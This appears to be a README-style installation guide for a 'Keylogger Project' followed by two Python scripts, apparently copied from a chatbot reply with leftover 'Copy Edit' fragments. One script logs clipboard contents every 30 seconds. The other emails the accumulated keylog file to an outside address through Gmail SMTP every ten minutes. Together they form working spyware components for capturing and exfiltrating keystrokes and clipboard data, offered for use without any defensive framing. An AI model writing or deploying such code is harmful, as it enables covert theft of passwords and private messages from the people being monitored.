# Installation Guide

This guide will help you set up the required Python environment and libraries to run the Keylogger Project.

---

## Required Python Libraries

- `pynput` — For capturing keyboard input  
- `pyperclip` — For clipboard access  
- `schedule` — For running periodic tasks  

---

## Step 1: Open Command Prompt / Terminal

- **Windows:** Press `Win + R`, type `cmd`, and press Enter.  
- **Mac:** Open Terminal from Applications > Utilities.  
- **Linux:** Open your preferred terminal emulator.

---

## Step 2: Verify Python and pip Installation

Run the following commands to verify installation:

```bash
python --version
pip --version
If either is not recognized, install Python from python.org.

Step 3: Install Required Libraries
Run this command:

bash
Copy
Edit
pip install pynput pyperclip schedule
If you encounter permission issues, try:

bash
Copy
Edit
pip install --user pynput pyperclip schedule
Or if pip is not recognized:

bash
Copy
Edit
python -m pip install pynput pyperclip schedule
Step 4: Verify Successful Installation
Run this command to confirm all libraries are installed:

bash
Copy
Edit
python -c "import pynput; import pyperclip; import schedule; print('All libraries installed successfully!')"
No errors means you’re ready!

Troubleshooting
If you have multiple Python versions, use python3 and pip3 instead of python and pip.

Ensure your PATH environment variable includes Python and pip executables.

On Linux/Mac, you might need to use sudo for global installations:

bash
Copy
Edit
sudo pip install pynput pyperclip schedule
Happy coding! If you encounter issues, feel free to open an issue on the repository.

python
Copy
Edit

---

And here are the two new code files, ready for you to add as separate `.py` files:

---

### `send_keylog.py`

```python
import smtplib
from email.mime.text import MIMEText
import time
import schedule

EMAIL_ADDRESS = "yourname@gmail.com"
EMAIL_PASSWORD = "yourapppassword"
TO_EMAIL = "receiveremail@gmail.com"
LOG_FILE = "keylog.txt"

def send_email():
    try:
        with open(LOG_FILE, "r") as f:
            content = f.read()

        msg = MIMEText(content)
        msg['Subject'] = 'Automated Keylog Report'
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = TO_EMAIL

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)

        print("✅ Log email sent successfully!")

    except Exception as e:
        print(f"❌ Failed to send email: {e}")

# Schedule: every 10 minutes
schedule.every(10).minutes.do(send_email)

print("📧 Automated email sender running. Press CTRL+C to stop.")

while True:
    schedule.run_pending()
    time.sleep(1)
clipboard_logger.py
python
Copy
Edit
import pyperclip
import time
from datetime import datetime

LOG_FILE = "keylog.txt"
last_clipboard = ""

def capture_clipboard():
    global last_clipboard
    try:
        clipboard_data = pyperclip.paste()
        if clipboard_data != last_clipboard:
            last_clipboard = clipboard_data
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            with open(LOG_FILE, "a") as f:
                f.write(f"{timestamp} - CLIPBOARD: {clipboard_data}\n")
            print(f"📋 Clipboard captured: {clipboard_data}")
    except Exception as e:
        print(f"❌ Clipboard capture error: {e}")

print("📋 Clipboard logger running. Press CTRL+C to stop.")

while True:
    capture_clipboard()
    time.sleep(30)  # Capture every 30 seconds





